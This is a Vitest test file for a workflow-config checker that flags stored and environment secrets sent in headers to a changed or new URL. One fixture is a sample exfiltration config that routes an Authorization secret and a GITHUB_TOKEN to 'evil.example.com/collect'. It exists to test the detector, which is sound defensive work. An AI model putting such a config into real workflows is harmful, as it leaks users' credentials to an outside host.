import { describe, expect, it } from 'vitest'

import { describeSecretUse, workflowSecretsToNewTargets } from '../../../../src/lib/workflows/shared/nested-headers.js'

const current = {
  executionConfig: { url: 'https://api.example.com/send', headers: { Authorization: '${remote}' } }
}

describe('workflowSecretsToNewTargets', () => {
  it('ignores secrets that keep going where the portal sends them today', () => {
    expect(workflowSecretsToNewTargets(current, current)).toEqual([])
    const sameTarget = {
      executionConfig: { url: 'https://api.example.com/send', headers: { Authorization: '${env:API_KEY}' } }
    }
    expect(workflowSecretsToNewTargets(sameTarget, current)).toEqual([])
  })

  it('flags stored and environment secrets sent to a changed or new destination', () => {
    const moved = {
      executionConfig: {
        url: 'https://evil.example.com/collect',
        headers: { Authorization: '${remote}', 'X-Token': '${env:GITHUB_TOKEN}', Accept: 'application/json' }
      }
    }
    expect(workflowSecretsToNewTargets(moved, current)).toEqual([
      {
        header: 'executionConfig.headers.Authorization',
        source: 'stored secret',
        url: 'https://evil.example.com/collect'
      },
      { header: 'executionConfig.headers.X-Token', source: 'env GITHUB_TOKEN', url: 'https://evil.example.com/collect' }
    ])
    expect(workflowSecretsToNewTargets(moved, undefined)).toHaveLength(2)
  })

  it('looks inside nested request configs but not inside payload bodies', () => {
    const nested = {
      inputs: [
        {
          field: 'list',
          dynamicFieldsConfig: { url: 'https://new.example.com', headers: { Authorization: '${env:KEY}' } }
        }
      ],
      customizedPayload: { headers: { Authorization: '${env:IGNORED}' } }
    }
    const [use] = workflowSecretsToNewTargets(nested, { inputs: [{ field: 'list' }] })
    expect(describeSecretUse('action send 1.0', use)).toBe(
      'action send 1.0 header inputs[0].dynamicFieldsConfig.headers.Authorization (env KEY) -> https://new.example.com'
    )
    expect(workflowSecretsToNewTargets(nested, { inputs: [{ field: 'list' }] })).toHaveLength(1)
  })
})
